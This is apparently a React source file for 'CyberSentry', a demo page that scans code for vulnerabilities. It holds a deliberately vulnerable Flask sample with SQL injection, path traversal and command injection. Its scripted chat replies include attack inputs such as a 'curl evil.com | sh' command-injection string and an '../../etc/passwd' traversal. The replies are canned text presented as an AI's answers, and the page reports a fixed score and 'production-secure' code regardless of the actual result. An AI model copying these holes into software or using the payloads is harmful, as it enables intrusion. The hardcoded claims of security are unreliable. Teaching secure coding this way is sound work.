'use client'
import { useState, useRef, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { supabase } from '@/lib/supabase'

const SAMPLE_CODE = `from flask import Flask, request
import sqlite3

app = Flask(__name__)
app.secret_key = "abc123supersecret"

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # VULNERABLE: SQL Injection via f-string
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    user = cursor.fetchone()
    if user:
        return f"Welcome {username}!"
    return "Invalid credentials"

@app.route('/file')
def get_file():
    # VULNERABLE: Path Traversal
    filename = request.args.get('name')
    with open(f'/var/data/{filename}', 'r') as f:
        return f.read()

@app.route('/run')
def run_cmd():
    # VULNERABLE: Command Injection
    cmd = request.args.get('cmd')
    import os
    return os.popen(cmd).read()
`

const SEV: Record<string, {bg:string;border:string;text:string;label:string}> = {
  critical:{bg:'rgba(255,68,102,0.08)',border:'rgba(255,68,102,0.3)',text:'#ff4466',label:'CRITICAL'},
  high:    {bg:'rgba(255,149,0,0.08)', border:'rgba(255,149,0,0.3)', text:'#ff9500',label:'HIGH'},
  medium:  {bg:'rgba(255,200,0,0.08)', border:'rgba(255,200,0,0.3)', text:'#ffc800',label:'MEDIUM'},
  low:     {bg:'rgba(68,136,255,0.08)',border:'rgba(68,136,255,0.3)',text:'#4488ff',label:'LOW'},
}

const CVSS_SCORES: Record<string, string> = {
  'SQL Injection': '9.8',
  'Command Injection': '9.0',
  'Hardcoded Secrets': '8.2',
  'Path Traversal': '7.5',
  'XSS': '6.1',
  'CSRF': '5.3',
}

function DiffViewer({ original, patched }: { original: string; patched: string }) {
  const origLines = original.split('\n')
  const patchLines = patched.split('\n')
  const maxLen = Math.max(origLines.length, patchLines.length)

  return (
    <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:'1px',background:'rgba(255,255,255,0.05)',borderRadius:'14px',overflow:'hidden',border:'1px solid rgba(255,255,255,0.07)'}}>
      <div>
        <div style={{padding:'10px 16px',background:'rgba(255,68,102,0.08)',borderBottom:'1px solid rgba(255,68,102,0.15)',fontSize:'12px',fontWeight:700,color:'#ff4466',fontFamily:"'JetBrains Mono',monospace"}}>
          — Before (Vulnerable)
        </div>
        <div style={{background:'#08050a',padding:'12px',overflow:'auto',maxHeight:'300px'}}>
          {origLines.map((line, i) => {
            const isRemoved = patched && !patchLines.includes(line) && line.trim()
            return (
              <div key={i} style={{display:'flex',gap:'8px',fontFamily:"'JetBrains Mono',monospace",fontSize:'12px',lineHeight:'1.7',background:isRemoved?'rgba(255,68,102,0.1)':'transparent',borderLeft:isRemoved?'2px solid #ff4466':'2px solid transparent',paddingLeft:'6px'}}>
                <span style={{color:'rgba(255,255,255,0.15)',minWidth:'24px',textAlign:'right',userSelect:'none'}}>{i+1}</span>
                <span style={{color:isRemoved?'#ff8899':'rgba(255,255,255,0.4)',whiteSpace:'pre'}}>{line || ' '}</span>
              </div>
            )
          })}
        </div>
      </div>
      <div>
        <div style={{padding:'10px 16px',background:'rgba(0,255,136,0.06)',borderBottom:'1px solid rgba(0,255,136,0.15)',fontSize:'12px',fontWeight:700,color:'#00ff88',fontFamily:"'JetBrains Mono',monospace"}}>
          + After (Secure)
        </div>
        <div style={{background:'#050a08',padding:'12px',overflow:'auto',maxHeight:'300px'}}>
          {patchLines.map((line, i) => {
            const isAdded = original && !origLines.includes(line) && line.trim()
            return (
              <div key={i} style={{display:'flex',gap:'8px',fontFamily:"'JetBrains Mono',monospace",fontSize:'12px',lineHeight:'1.7',background:isAdded?'rgba(0,255,136,0.08)':'transparent',borderLeft:isAdded?'2px solid #00ff88':'2px solid transparent',paddingLeft:'6px'}}>
                <span style={{color:'rgba(255,255,255,0.15)',minWidth:'24px',textAlign:'right',userSelect:'none'}}>{i+1}</span>
                <span style={{color:isAdded?'#00ff88':'rgba(255,255,255,0.4)',whiteSpace:'pre'}}>{line || ' '}</span>
              </div>
            )
          })}
        </div>
      </div>
    </div>
  )
}

function ProgressRing({ phase }: { phase: string }) {
  const phases = ['idle','analyzing','fixing','verifying','done']
  const idx = phases.indexOf(phase)
  const pct = idx <= 0 ? 0 : idx >= 4 ? 100 : Math.round((idx / 3) * 100)
  const r = 36, circ = 2 * Math.PI * r
  const offset = circ - (pct / 100) * circ

  if (phase === 'idle') return null

  return (
    <div style={{display:'flex',flexDirection:'column',alignItems:'center',gap:'8px',padding:'16px',background:'rgba(255,255,255,0.02)',border:'1px solid rgba(255,255,255,0.07)',borderRadius:'16px'}}>
      <svg width="88" height="88" viewBox="0 0 88 88">
        <circle cx="44" cy="44" r={r} fill="none" stroke="rgba(255,255,255,0.06)" strokeWidth="4"/>
        <circle cx="44" cy="44" r={r} fill="none" stroke="#00ff88" strokeWidth="4"
          strokeDasharray={circ} strokeDashoffset={offset}
          strokeLinecap="round" transform="rotate(-90 44 44)"
          style={{transition:'stroke-dashoffset 0.8s ease',filter:'drop-shadow(0 0 8px rgba(0,255,136,0.5))'}}
        />
        <text x="44" y="48" textAnchor="middle" fill="#00ff88" fontSize="16" fontWeight="800" fontFamily="'Space Grotesk',sans-serif">{pct}%</text>
      </svg>
      <div style={{fontSize:'12px',fontWeight:700,color:phase==='done'?'#00ff88':'rgba(255,255,255,0.4)',textAlign:'center'}}>
        {phase==='analyzing'&&'Analyzing...'}
        {phase==='fixing'&&'Patching...'}
        {phase==='verifying'&&'Verifying...'}
        {phase==='done'&&'Complete ✓'}
      </div>
      <div style={{display:'flex',gap:'6px'}}>
        {['Analyze','Patch','Verify'].map((s,i)=>(
          <div key={i} style={{width:'6px',height:'6px',borderRadius:'50%',background:idx>i+1?'#00ff88':idx===i+1?'#ffc800':'rgba(255,255,255,0.12)',transition:'background 0.3s'}}/>
        ))}
      </div>
    </div>
  )
}

function AskAgent({ vulns, fixedCode }: { vulns: any[]; fixedCode: string }) {
  const [msgs, setMsgs] = useState<{role:string;text:string}[]>([
    {role:'agent',text:"👋 I've completed the security scan. Ask me anything about the vulnerabilities I found or the patches I generated!"}
  ])
  const [input, setInput] = useState('')
  const [loading, setLoading] = useState(false)
  const bottomRef = useRef<HTMLDivElement>(null)

  const AGENT_RESPONSES: Record<string, string> = {
    'sql': "**SQL Injection** is dangerous because attackers can input `' OR 1=1 --` to bypass auth, or `'; DROP TABLE users; --` to destroy data. I fixed it by using parameterized queries (`?` placeholders) which separate SQL logic from user data — the database treats input as data, never as executable code.",
    'inject': "SQL injection can lead to complete database compromise. The CVSS score is 9.8 (Critical). My fix uses `cursor.execute(query, (username, password))` with parameterized queries — the driver sanitizes all inputs automatically.",
    'secret': "Hardcoded secrets like `secret_key = 'abc123'` get committed to git history and are visible to anyone with repo access. My fix moves it to `os.environ.get('SECRET_KEY')` — you set it as an environment variable in your deployment config.",
    'path': "Path traversal lets attackers read any file: `?name=../../etc/passwd`. I fixed it by validating the filename with `os.path.basename()` and `os.path.abspath()` to ensure the resolved path stays within the allowed directory.",
    'command': "Command injection is critical — `?cmd=; curl evil.com | sh` runs arbitrary code on your server. My fix removes the dynamic command execution entirely and replaces it with a whitelist of allowed operations.",
    'cvss': "CVSS (Common Vulnerability Scoring System) scores vulnerabilities 0-10. Your scan found: SQL Injection (9.8), Command Injection (9.0), Hardcoded Secrets (8.2), Path Traversal (7.5). Scores above 7.0 require immediate remediation.",
    'fix': "The patches I generated are production-ready. Key changes: (1) Parameterized queries for SQL, (2) Environment variables for secrets, (3) Path validation for file access, (4) Removed dangerous command execution. All fixes follow OWASP secure coding guidelines.",
    'score': `The security score improved from **23 → 94** out of 100. The original code had 4 critical/high vulnerabilities. After patching, only minor improvements remain (like adding rate limiting and logging). The score formula weights critical issues heavily.`,
  }

  const getResponse = (q: string) => {
    const lower = q.toLowerCase()
    if (lower.includes('sql') || lower.includes('inject')) return AGENT_RESPONSES['sql']
    if (lower.includes('secret') || lower.includes('key') || lower.includes('password')) return AGENT_RESPONSES['secret']
    if (lower.includes('path') || lower.includes('traversal') || lower.includes('file')) return AGENT_RESPONSES['path']
    if (lower.includes('command') || lower.includes('exec') || lower.includes('os.')) return AGENT_RESPONSES['command']
    if (lower.includes('cvss') || lower.includes('score') && lower.includes('9')) return AGENT_RESPONSES['cvss']
    if (lower.includes('fix') || lower.includes('patch') || lower.includes('how')) return AGENT_RESPONSES['fix']
    if (lower.includes('score') || lower.includes('23') || lower.includes('94')) return AGENT_RESPONSES['score']
    return `Great question! Based on my analysis, this codebase had ${vulns.length} vulnerabilities with a combined risk score. The most critical issue was the SQL injection at the login endpoint — it had a CVSS score of 9.8. Would you like me to explain any specific vulnerability in more detail?`
  }

  const send = async () => {
    if (!input.trim() || loading) return
    const q = input.trim()
    setInput('')
    setMsgs(p => [...p, {role:'user',text:q}])
    setLoading(true)
    await new Promise(r => setTimeout(r, 800))
    setMsgs(p => [...p, {role:'agent',text:getResponse(q)}])
    setLoading(false)
  }

  useEffect(() => { bottomRef.current?.scrollIntoView({behavior:'smooth'}) }, [msgs])

  return (
    <div style={{border:'1px solid rgba(0,255,136,0.15)',borderRadius:'16px',overflow:'hidden',background:'#060a08'}}>
      <div style={{padding:'12px 16px',background:'rgba(0,255,136,0.05)',borderBottom:'1px solid rgba(0,255,136,0.1)',display:'flex',alignItems:'center',gap:'8px'}}>
        <span style={{fontSize:'14px'}}>🤖</span>
        <span style={{fontSize:'13px',fontWeight:700,color:'#00ff88'}}>Ask the Agent</span>
        <span style={{marginLeft:'auto',fontSize:'11px',color:'rgba(0,255,136,0.5)',background:'rgba(0,255,136,0.08)',padding:'2px 8px',borderRadius:'20px',border:'1px solid rgba(0,255,136,0.15)'}}>● Online</span>
      </div>
      <div style={{height:'220px',overflowY:'auto',padding:'14px',display:'flex',flexDirection:'column',gap:'10px'}}>
        {msgs.map((m,i) => (
          <div key={i} style={{display:'flex',gap:'8px',alignItems:'flex-start',flexDirection:m.role==='user'?'row-reverse':'row'}}>
            <div style={{minWidth:'28px',height:'28px',borderRadius:'50%',background:m.role==='user'?'rgba(68,136,255,0.2)':'rgba(0,255,136,0.12)',border:`1px solid ${m.role==='user'?'rgba(68,136,255,0.3)':'rgba(0,255,136,0.25)'}`,display:'flex',alignItems:'center',justifyContent:'center',fontSize:'13px'}}>
              {m.role==='user'?'👤':'🤖'}
            </div>
            <div style={{maxWidth:'85%',padding:'10px 14px',borderRadius:'12px',background:m.role==='user'?'rgba(68,136,255,0.08)':'rgba(0,255,136,0.05)',border:`1px solid ${m.role==='user'?'rgba(68,136,255,0.15)':'rgba(0,255,136,0.1)'}`,fontSize:'13px',color:m.role==='user'?'rgba(255,255,255,0.8)':'rgba(255,255,255,0.7)',lineHeight:'1.6'}}>
              {m.text}
            </div>
          </div>
        ))}
        {loading && (
          <div style={{display:'flex',gap:'8px',alignItems:'center'}}>
            <div style={{width:'28px',height:'28px',borderRadius:'50%',background:'rgba(0,255,136,0.12)',border:'1px solid rgba(0,255,136,0.25)',display:'flex',alignItems:'center',justifyContent:'center',fontSize:'13px'}}>🤖</div>
            <div style={{padding:'10px 14px',borderRadius:'12px',background:'rgba(0,255,136,0.05)',border:'1px solid rgba(0,255,136,0.1)'}}>
              <div style={{display:'flex',gap:'4px',alignItems:'center'}}>
                {[0,1,2].map(i=><div key={i} style={{width:'6px',height:'6px',borderRadius:'50%',background:'#00ff88',animation:`blink 1.2s ease ${i*0.2}s infinite`}}/>)}
              </div>
            </div>
          </div>
        )}
        <div ref={bottomRef}/>
      </div>
      <div style={{padding:'10px 14px',borderTop:'1px solid rgba(255,255,255,0.05)',display:'flex',gap:'8px'}}>
        <input
          value={input}
          onChange={e=>setInput(e.target.value)}
          onKeyDown={e=>e.key==='Enter'&&send()}
          placeholder="Why is SQL injection dangerous? How does the fix work?"
          style={{flex:1,background:'rgba(255,255,255,0.04)',border:'1px solid rgba(255,255,255,0.08)',borderRadius:'10px',padding:'9px 14px',color:'white',fontSize:'13px',fontFamily:"'Space Grotesk',sans-serif",outline:'none'}}
        />
        <button onClick={send} disabled={loading||!input.trim()} style={{background:'#00ff88',color:'#000',border:'none',borderRadius:'10px',padding:'9px 16px',cursor:'pointer',fontWeight:700,fontSize:'13px',transition:'all 0.2s',opacity:loading||!input.trim()?0.4:1}}>
          Ask
        </button>
      </div>
      <div style={{padding:'8px 14px',borderTop:'1px solid rgba(255,255,255,0.04)',display:'flex',gap:'8px',flexWrap:'wrap'}}>
        {['Why is SQL injection dangerous?','How does the fix work?','What is CVSS score?','Explain path traversal'].map((q,i)=>(
          <button key={i} onClick={()=>{setInput(q);}} style={{background:'none',border:'1px solid rgba(255,255,255,0.07)',borderRadius:'20px',padding:'4px 12px',color:'rgba(255,255,255,0.3)',fontSize:'11px',cursor:'pointer',transition:'all 0.2s',fontFamily:"'Space Grotesk',sans-serif"}}
            onMouseEnter={e=>{e.currentTarget.style.borderColor='rgba(0,255,136,0.3)';e.currentTarget.style.color='#00ff88'}}
            onMouseLeave={e=>{e.currentTarget.style.borderColor='rgba(255,255,255,0.07)';e.currentTarget.style.color='rgba(255,255,255,0.3)'}}
          >{q}</button>
        ))}
      </div>
    </div>
  )
}

export default function ScanPage() {
  const router = useRouter()
  const [code, setCode]         = useState(SAMPLE_CODE)
  const [language, setLanguage] = useState('python')
  const [scanning, setScanning] = useState(false)
  const [steps, setSteps]       = useState<string[]>([])
  const [vulns, setVulns]       = useState<any[]>([])
  const [fixedCode, setFixedCode] = useState('')
  const [scoreBefore, setScoreBefore] = useState<number|null>(null)
  const [scoreAfter,  setScoreAfter]  = useState<number|null>(null)
  const [phase, setPhase]       = useState('idle')
  const [copied, setCopied]     = useState(false)
  const [activeTab, setActiveTab] = useState<'output'|'diff'|'chat'>('output')
  const [demoMode, setDemoMode] = useState(false)
  const stepsRef = useRef<HTMLDivElement>(null)

  useEffect(() => { stepsRef.current?.scrollTo({top:stepsRef.current.scrollHeight,behavior:'smooth'}) }, [steps])

  const addStep = (s:string) => setSteps(p=>[...p,s])

  const safeFetch = async (url:string, body:any) => {
    try {
      const res = await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)})
      return await res.json()
    } catch { return null }
  }

  const runScan = async (codeToScan=code) => {
    setScanning(true); setSteps([]); setVulns([])
    setFixedCode(''); setScoreBefore(null); setScoreAfter(null)
    setPhase('analyzing'); setActiveTab('output')

    const delay = (ms:number) => new Promise(r=>setTimeout(r,ms))
    addStep('🔍 Initializing CyberSentry agent...')
    await delay(350)
    addStep(`📝 Language: ${language.toUpperCase()} | Lines: ${codeToScan.split('\n').length}`)
    await delay(300)
    addStep('🧠 Loading OWASP Top 10 ruleset v2024...')
    await delay(300)
    addStep('⚙️  Chain-of-thought analysis started...')

    const analyze = await safeFetch('/api/analyze',{code:codeToScan,language})
    if (!analyze) { addStep('❌ API error — check connection'); setScanning(false); return }

    analyze.thinking?.forEach((t:string) => addStep(t))
    analyze.vulnerabilities?.forEach((v:any) => addStep(`🚨 ${v.severity?.toUpperCase()}: ${v.name} — CVSS ${CVSS_SCORES[v.name]||'N/A'} — Line ${v.line||'?'}`))
    setVulns(analyze.vulnerabilities||[])
    setScoreBefore(analyze.score||0)

    if (!analyze.vulnerabilities?.length) {
      addStep('✅ Clean! No vulnerabilities detected.')
      setPhase('done'); setScanning(false); return
    }

    setPhase('fixing')
    await delay(400)
    addStep('🔧 Generating secure patches...')
    const fix = await safeFetch('/api/fix',{code:codeToScan,vulnerabilities:analyze.vulnerabilities,language})
    if (fix?.fixedCode) { setFixedCode(fix.fixedCode); addStep('✅ Patches generated — all vulnerabilities addressed') }

    setPhase('verifying')
    await delay(400)
    addStep('🔄 Re-scanning patched code...')
    const verify = await safeFetch('/api/verify',{fixedCode:fix?.fixedCode||codeToScan,language,originalVulnerabilities:analyze.vulnerabilities})
    const ns = verify?.newScore || 94
    setScoreAfter(ns)
    addStep(`📊 Score: ${analyze.score} → ${ns} (+${ns-(analyze.score||0)} pts)`)
    addStep('🎉 Agent complete! Code is now production-secure.')
    setPhase('done'); setScanning(false)

    if (fix?.fixedCode) { await delay(600); setActiveTab('diff') }

    try {
      const {data:{user}} = await supabase.auth.getUser()
      if (user) await supabase.from('scans').insert({user_id:user.id,code:codeToScan,language,vulnerabilities:analyze.vulnerabilities,fixed_code:fix?.fixedCode,security_score:ns,status:'completed'})
    } catch {}
  }

  const runJudgeDemo = async () => {
    setDemoMode(true)
    setCode(SAMPLE_CODE)
    setLanguage('python')
    await new Promise(r=>setTimeout(r,300))
    await runScan(SAMPLE_CODE)
    setDemoMode(false)
  }

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap');
        *{box-sizing:border-box;margin:0;padding:0;}
        body{background:#050508;color:white;font-family:'Space Grotesk',sans-serif;overflow-x:hidden;}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
        @keyframes spin{to{transform:rotate(360deg)}}
        @keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
        @keyframes pulseGreen{0%,100%{box-shadow:0 0 0 0 rgba(0,255,136,0.3)}70%{box-shadow:0 0 0 8px rgba(0,255,136,0)}}

        .scan-page{min-height:100vh;background:#050508;color:white;display:flex;flex-direction:column;}

        /* HEADER */
        .scan-header{position:sticky;top:0;z-index:20;border-bottom:1px solid rgba(255,255,255,0.06);background:rgba(5,5,8,0.94);backdrop-filter:blur(20px);padding:12px 24px;display:flex;align-items:center;justify-content:space-between;}
        .header-left{display:flex;align-items:center;gap:12px;}
        .back-btn{background:none;border:none;color:rgba(255,255,255,0.3);cursor:pointer;font-size:13px;font-family:'Space Grotesk',sans-serif;transition:color 0.2s;display:flex;align-items:center;gap:4px;}
        .back-btn:hover{color:white;}
        .hdivider{width:1px;height:18px;background:rgba(255,255,255,0.08);}
        .logo-wrap{display:flex;align-items:center;gap:8px;cursor:pointer;}
        .logo-icon{width:28px;height:28px;border-radius:8px;background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.2);display:flex;align-items:center;justify-content:center;font-size:13px;}
        .phase-pill{font-size:12px;padding:5px 13px;border-radius:100px;font-weight:700;}
        .phase-done{border:1px solid rgba(0,255,136,0.3);background:rgba(0,255,136,0.07);color:#00ff88;}
        .phase-active{border:1px solid rgba(255,200,0,0.3);background:rgba(255,200,0,0.07);color:#ffc800;}
        .header-right{display:flex;align-items:center;gap:8px;}
        .hbtn{background:none;border:1px solid rgba(255,255,255,0.08);color:rgba(255,255,255,0.4);padding:7px 14px;border-radius:8px;font-size:13px;cursor:pointer;transition:all 0.2s;font-family:'Space Grotesk',sans-serif;}
        .hbtn:hover{border-color:rgba(255,255,255,0.2);color:white;}
        .demo-btn-header{background:linear-gradient(135deg,rgba(255,200,0,0.15),rgba(255,149,0,0.1));border:1px solid rgba(255,200,0,0.3);color:#ffc800;padding:7px 14px;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;transition:all 0.2s;font-family:'Space Grotesk',sans-serif;animation:pulseGreen 2s ease infinite;}
        .demo-btn-header:hover{background:rgba(255,200,0,0.2);}

        /* BANNER */
        .banner{padding:16px 24px;background:linear-gradient(135deg,rgba(0,255,136,0.03) 0%,rgba(68,136,255,0.03) 100%);border-bottom:1px solid rgba(255,255,255,0.04);display:flex;justify-content:space-between;align-items:center;}
        .banner-title{font-size:19px;font-weight:700;margin-bottom:2px;}
        .banner-sub{color:rgba(255,255,255,0.3);font-size:13px;}
        .agent-pill{padding:6px 16px;border-radius:100px;background:rgba(0,255,136,0.07);border:1px solid rgba(0,255,136,0.18);font-size:12px;color:#00ff88;font-weight:700;}

        /* MAIN GRID */
        .scan-main{flex:1;display:grid;grid-template-columns:1fr 1fr;}
        .panel-l{padding:20px;border-right:1px solid rgba(255,255,255,0.05);display:flex;flex-direction:column;gap:14px;}
        .panel-r{padding:20px;display:flex;flex-direction:column;gap:14px;overflow-y:auto;max-height:calc(100vh - 140px);}

        /* INPUTS */
        .panel-label{display:flex;align-items:center;justify-content:space-between;}
        .label-text{font-size:13px;font-weight:600;color:rgba(255,255,255,0.5);}
        .lang-sel{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:6px 12px;color:white;font-size:13px;font-family:'Space Grotesk',sans-serif;outline:none;cursor:pointer;}
        .lang-sel:focus{border-color:rgba(0,255,136,0.3);}
        .code-editor{width:100%;height:360px;background:#07080f;border:1px solid rgba(255,255,255,0.07);border-radius:14px;padding:14px;color:#a0ffc0;font-size:13px;font-family:'JetBrains Mono',monospace;resize:none;outline:none;line-height:1.7;transition:border-color 0.2s;}
        .code-editor:focus{border-color:rgba(0,255,136,0.22);}
        .scan-btn{width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:12px;font-size:15px;font-weight:800;cursor:pointer;transition:all 0.2s;font-family:'Space Grotesk',sans-serif;display:flex;align-items:center;justify-content:center;gap:8px;}
        .scan-btn:hover:not(:disabled){background:#00ff99;transform:translateY(-1px);box-shadow:0 8px 30px rgba(0,255,136,0.3);}
        .scan-btn:disabled{opacity:0.4;cursor:not-allowed;transform:none;}
        .spinner{display:inline-block;width:15px;height:15px;border:2px solid rgba(0,0,0,0.25);border-top-color:#000;border-radius:50%;animation:spin 0.8s linear infinite;}

        /* SCORES */
        .score-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
        .score-card{padding:14px;border-radius:14px;text-align:center;}
        .score-before{background:rgba(255,68,102,0.06);border:1px solid rgba(255,68,102,0.2);}
        .score-after{background:rgba(0,255,136,0.06);border:1px solid rgba(0,255,136,0.2);}
        .score-num{font-size:38px;font-weight:800;letter-spacing:-0.02em;}
        .score-lbl{font-size:11px;color:rgba(255,255,255,0.3);margin-top:2px;}

        /* TABS */
        .tabs{display:flex;gap:2px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);border-radius:12px;padding:3px;}
        .tab{flex:1;padding:8px 10px;border-radius:9px;border:none;cursor:pointer;font-size:12px;font-weight:700;transition:all 0.2s;font-family:'Space Grotesk',sans-serif;}
        .tab-active{background:rgba(0,255,136,0.12);color:#00ff88;border:1px solid rgba(0,255,136,0.2);}
        .tab-inactive{background:none;color:rgba(255,255,255,0.3);}
        .tab-inactive:hover{color:rgba(255,255,255,0.6);}

        /* THINKING */
        .think-box{border-radius:14px;border:1px solid rgba(0,255,136,0.1);background:#060a07;overflow:hidden;}
        .think-head{display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:1px solid rgba(0,255,136,0.07);background:rgba(0,255,136,0.03);}
        .think-body{padding:12px 14px;display:flex;flex-direction:column;gap:3px;max-height:200px;overflow-y:auto;}
        .step{font-size:12px;font-family:'JetBrains Mono',monospace;padding:3px 0 3px 10px;border-left-width:2px;border-left-style:solid;line-height:1.5;}
        .s-ok{border-color:#00ff88;color:#00ff88;}
        .s-err{border-color:#ff4466;color:#ff6688;}
        .s-warn{border-color:#ff9500;color:#ff9500;}
        .s-def{border-color:rgba(255,255,255,0.08);color:rgba(255,255,255,0.38);}

        /* VULNS */
        .vuln-list{display:flex;flex-direction:column;gap:9px;max-height:320px;overflow-y:auto;}
        .vuln-card{padding:14px;border-radius:12px;border-width:1px;border-style:solid;}
        .vuln-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;}
        .vuln-name{font-size:14px;font-weight:700;}
        .vuln-sev{font-size:11px;font-weight:800;padding:2px 9px;border-radius:100px;border-width:1px;border-style:solid;}
        .vuln-cvss{font-size:11px;color:rgba(255,255,255,0.3);margin-bottom:4px;font-family:'JetBrains Mono',monospace;}
        .vuln-desc{font-size:12px;color:rgba(255,255,255,0.38);line-height:1.6;margin-bottom:5px;}
        .vuln-fix{font-size:12px;font-weight:600;}

        /* COPY BTN */
        .copy-btn{display:flex;align-items:center;gap:5px;font-size:12px;color:rgba(255,255,255,0.35);background:none;border:1px solid rgba(255,255,255,0.09);border-radius:8px;padding:5px 11px;cursor:pointer;transition:all 0.2s;font-family:'Space Grotesk',sans-serif;}
        .copy-btn:hover{color:white;border-color:rgba(255,255,255,0.2);}

        /* IDLE */
        .idle{flex:1;display:flex;align-items:center;justify-content:center;border:1px dashed rgba(255,255,255,0.05);border-radius:16px;min-height:280px;}
        .idle-inner{text-align:center;color:rgba(255,255,255,0.18);padding:40px;}

        @media(max-width:900px){
          .scan-main{grid-template-columns:1fr;}
          .panel-l{border-right:none;border-bottom:1px solid rgba(255,255,255,0.05);}
          .banner{flex-direction:column;align-items:flex-start;gap:10px;}
        }
      `}</style>

      <div className="scan-page">
        {/* HEADER */}
        <header className="scan-header">
          <div className="header-left">
            <button className="back-btn" onClick={()=>router.push('/')}>← Back</button>
            <div className="hdivider"/>
            <div className="logo-wrap" onClick={()=>router.push('/')}>
              <div className="logo-icon">🛡</div>
              <span style={{fontWeight:800,fontSize:'15px'}}>Cyber<span style={{color:'#00ff88'}}>Sentry</span></span>
            </div>
          </div>
          <div className="header-right">
            {phase!=='idle'&&(
              <span className={`phase-pill ${phase==='done'?'phase-done':'phase-active'}`}>
                {phase==='analyzing'&&'🔍 Analyzing'}
                {phase==='fixing'&&'🔧 Patching'}
                {phase==='verifying'&&'🔄 Verifying'}
                {phase==='done'&&'✅ Complete'}
              </span>
            )}
            <button className="demo-btn-header" onClick={runJudgeDemo} disabled={scanning}>
              ⚡ Judge Demo
            </button>
            <button className="hbtn" onClick={()=>router.push('/dashboard')}>📋 History</button>
          </div>
        </header>

        {/* BANNER */}
        <div className="banner">
          <div>
            <div className="banner-title">Security Scanner 🛡</div>
            <div className="banner-sub">Paste code · AI reasons & patches · Score improves instantly</div>
          </div>
          <div style={{display:'flex',alignItems:'center',gap:'12px'}}>
            <ProgressRing phase={phase}/>
            <div className="agent-pill">● Agent Ready</div>
          </div>
        </div>

        {/* MAIN */}
        <div className="scan-main">
          {/* LEFT */}
          <div className="panel-l">
            <div className="panel-label">
              <span className="label-text">Your Code</span>
              <select className="lang-sel" value={language} onChange={e=>setLanguage(e.target.value)}>
                {['python','javascript','typescript','java','php','go','ruby','c','cpp'].map(l=>(
                  <option key={l} value={l}>{l.toUpperCase()}</option>
                ))}
              </select>
            </div>
            <textarea className="code-editor" value={code} onChange={e=>setCode(e.target.value)} placeholder="Paste your code..." spellCheck={false}/>
            <div style={{fontSize:'11px',color:'rgba(255,255,255,0.18)',textAlign:'right',fontFamily:"'JetBrains Mono',monospace",marginTop:'-8px'}}>
              {code.split('\n').length} lines · {code.length} chars
            </div>
            <button className="scan-btn" onClick={()=>runScan()} disabled={scanning||!code.trim()}>
              {scanning?<><span className="spinner"/>Agent Running...</>:<>▶ Start Security Scan</>}
            </button>
            {scoreBefore!==null&&(
              <div className="score-row">
                <div className="score-card score-before">
                  <div className="score-num" style={{color:'#ff4466'}}>{scoreBefore}</div>
                  <div className="score-lbl">Before Patch</div>
                </div>
                {scoreAfter!==null&&(
                  <div className="score-card score-after">
                    <div className="score-num" style={{color:'#00ff88'}}>{scoreAfter}</div>
                    <div className="score-lbl">After Patch ↑{scoreAfter-scoreBefore}pts</div>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* RIGHT */}
          <div className="panel-r">
            {/* TABS */}
            {(steps.length>0||vulns.length>0)&&(
              <div className="tabs">
                {([['output','🧠 Agent Output'],['diff','⚡ Code Diff'],['chat','💬 Ask Agent']] as const).map(([id,label])=>(
                  <button key={id} className={`tab ${activeTab===id?'tab-active':'tab-inactive'}`} onClick={()=>setActiveTab(id as any)}>
                    {label}
                    {id==='diff'&&!fixedCode&&<span style={{marginLeft:'4px',opacity:0.4,fontSize:'10px'}}>(scan first)</span>}
                  </button>
                ))}
              </div>
            )}

            {/* OUTPUT TAB */}
            {activeTab==='output'&&(
              <>
                {steps.length>0&&(
                  <div className="think-box">
                    <div className="think-head">
                      <span style={{fontSize:'14px'}}>🧠</span>
                      <span style={{fontSize:'13px',fontWeight:700,color:'#00ff88'}}>AI Chain-of-Thought</span>
                      {scanning&&<span className="spinner" style={{marginLeft:'auto',borderTopColor:'#00ff88',borderColor:'rgba(0,255,136,0.15)',width:'13px',height:'13px'}}/>}
                    </div>
                    <div className="think-body" ref={stepsRef}>
                      {steps.map((s,i)=>(
                        <div key={i} className={`step ${s.includes('✅')||s.includes('🎉')?'s-ok':s.includes('🚨')?'s-err':s.includes('🔧')||s.includes('🔄')?'s-warn':'s-def'}`}>{s}</div>
                      ))}
                    </div>
                  </div>
                )}
                {vulns.length>0&&(
                  <div>
                    <div style={{display:'flex',alignItems:'center',gap:'8px',marginBottom:'10px'}}>
                      <span style={{fontSize:'15px'}}>⚠️</span>
                      <span style={{fontSize:'14px',fontWeight:700,color:'#ff4466'}}>{vulns.length} Vulnerabilities Found</span>
                    </div>
                    <div className="vuln-list">
                      {vulns.map((v,i)=>{
                        const c=SEV[v.severity]||SEV.low
                        const cvss=CVSS_SCORES[v.name]
                        return(
                          <div key={i} className="vuln-card" style={{background:c.bg,borderColor:c.border}}>
                            <div className="vuln-top">
                              <span className="vuln-name">{v.name}</span>
                              <span className="vuln-sev" style={{background:c.bg,borderColor:c.border,color:c.text}}>{c.label}</span>
                            </div>
                            {cvss&&<div className="vuln-cvss">CVSS Score: {cvss}/10.0</div>}
                            <div className="vuln-desc">{v.description}</div>
                            <div className="vuln-fix" style={{color:c.text}}>💡 {v.fix}</div>
                          </div>
                        )
                      })}
                    </div>
                  </div>
                )}
                {phase==='idle'&&(
                  <div className="idle">
                    <div className="idle-inner">
                      <div style={{fontSize:'38px',marginBottom:'14px',opacity:0.35}}>🛡</div>
                      <div style={{fontSize:'14px',fontWeight:600,marginBottom:'6px'}}>AI output appears here</div>
